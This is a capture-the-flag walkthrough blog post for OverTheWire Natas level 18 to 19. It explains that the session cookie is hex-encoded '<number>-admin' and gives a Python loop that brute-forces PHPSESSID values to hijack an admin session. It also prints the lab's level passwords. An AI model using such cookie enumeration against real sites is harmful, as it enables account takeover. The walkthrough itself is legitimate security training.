---
layout: post-with-comments
title: "OverTheWire Natas Level 18 → 19 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-18-to-19/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, session, bruteforce]
description: "A step by step tutorial for OverTheWire Natas Level 18 → 19!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-17-to-18/' | relative_url }}">← Previous: Level 17 → 18</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas19.html" target="_blank" rel="noopener">
      Official (Level 19) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-19-to-20/' | relative_url }}">
      Next: Level 19 → 20 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas19.natas.labs.overthewire.org>  
Credentials: **natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr**

```bash
# Using curl (optional):
curl -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr 
  http://natas19.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-18-to-19/homepage.jpg' | relative_url }})

---

## Task

The page says it reuses level 18’s logic, **but session IDs are no longer sequential**. Goal: obtain an **admin** session and read the next credentials.

---

## A little bit of Theory

After any login we receive a cookie like:

```
PHPSESSID=3235352d61646d696e
```

This looks like **hex-encoded ASCII**. Decoding gives:

```
255-admin
```

So the server’s session key format is `<number>-admin`, then **hexlify**. If we try enough numbers, we’ll hit an existing admin session.

---

## Solution

Bruteforce `PHPSESSID` by hex-encoding `"${id}-admin"`.

```python
import requests, binascii

URL = "http://natas19.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for i in range(1000):  # 0..999 is plenty
    raw = f"{i}-admin".encode()
    sess = binascii.hexlify(raw).decode()
    r = s.get(URL, cookies={"PHPSESSID": sess})
    if "Login as an admin to retrieve" not in r.text:
        print("[+] Admin session found!")
        print(r.text)
        break
```

Notes:

* We don’t need valid username/password — we only need the **right cookie**.
* Stop when the page **doesn’t** show “Login as an admin to retrieve …”.



![output]({{ '/assets/images/natas/level-18-to-19/output.jpg' | relative_url }})

---

## Password

```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

---

**Troubleshooting**

* Still seeing the login prompt? → Your cookie likely isn’t admin; keep iterating.
* Getting 403s or rate limits? → Add a small `time.sleep(0.05)` between requests.
* Hex looks wrong? → Ensure you `.encode()` then `binascii.hexlify(...).decode()`.

---

**Nice work 🎉** You reversed the session format and snagged the admin creds. Onward to **natas20**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
